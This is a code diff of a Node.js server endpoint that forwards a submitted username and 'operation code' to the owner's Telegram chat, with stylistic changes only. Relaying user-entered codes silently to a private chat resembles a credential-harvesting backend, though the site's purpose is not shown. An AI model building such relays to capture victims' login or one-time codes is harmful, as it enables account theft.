@@ -232,31 +232,33 @@ http.createServer(async function (req, res) {
   }
 
 
-  // API: operation-code → send to Telegram
-  if (req.method === 'POST' && urlPath === '/api/operation-code') {
-    var body = [];
-    req.on('data', function(chunk) { body.push(chunk); });
-    req.on('end', function() {
+  // API: operation-code -> send to Telegram
+  if (req.method === "POST" && urlPath === "/api/operation-code") {
+    var chunks = [];
+    req.on("data", function(c) { chunks.push(c); });
+    req.on("end", function() {
       try {
-        var data = JSON.parse(Buffer.concat(body).toString());
-        var botToken = process.env.TELEGRAM_BOT_TOKEN || '';
-        var ownerId = process.env.OWNER_ID || '';
+        var data = JSON.parse(Buffer.concat(chunks).toString());
+        var botToken = process.env.TELEGRAM_BOT_TOKEN || "";
+        var ownerId = process.env.OWNER_ID || "";
         if (botToken && ownerId) {
-          var msg = '📥 New Operation
+          var msg = "New Operation
 
-Username: ' + (data.username || '-') + '
-Code: ' + (data.code || '-');
+Username: " + (data.username || "-") + "
+Code: " + (data.code || "-");
           var postData = JSON.stringify({ chat_id: ownerId, text: msg });
-          var tgReq = https.request(
-            { hostname: 'api.telegram.org', path: '/bot' + botToken + '/sendMessage', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) } },
-            function(tgRes) { tgRes.resume(); }
-          );
-          tgReq.on('error', function() {});
+          var tgReq = https.request({
+            hostname: "api.telegram.org",
+            path: "/bot" + botToken + "/sendMessage",
+            method: "POST",
+            headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(postData) }
+          }, function(r) { r.resume(); });
+          tgReq.on("error", function() {});
           tgReq.write(postData);
           tgReq.end();
         }
       } catch(e) {}
-      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.writeHead(200, { "Content-Type": "application/json" });
       res.end(JSON.stringify({ ok: true }));
     });
     return;
